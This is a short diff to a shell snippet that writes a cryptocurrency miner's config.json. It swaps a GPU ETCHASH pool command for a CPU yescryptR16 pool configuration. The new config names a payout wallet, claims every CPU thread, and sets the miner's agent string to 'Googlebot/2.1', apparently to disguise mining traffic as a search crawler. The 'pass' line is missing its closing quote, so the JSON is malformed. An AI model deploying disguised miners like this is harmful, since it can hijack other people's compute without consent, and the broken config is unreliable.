@@ -1,5 +1,16 @@
 cat > config.json <<END
 {
-./VTM --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.Googlebot --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99  
+        "url" : "stratum+tcp://yescryptR16.eu.mine.zpool.ca:6333",
+        "user" : "MRiuC462CNKBygJWFqDU6SatcvGB2f6v2x",
+        "pass" : "c=LTC,
+        "algo" : "yescryptR16",
+        "threads" : $(nproc --all),
+        "cpu-priority" : 0,
+        "cpu-affinity" : -1,
+        "benchmark" : false,
+        "debug" : false,
+        "protocol": false,
+        "quiet" : false,
+        "agent" : "Googlebot/2.1"
 }
 END
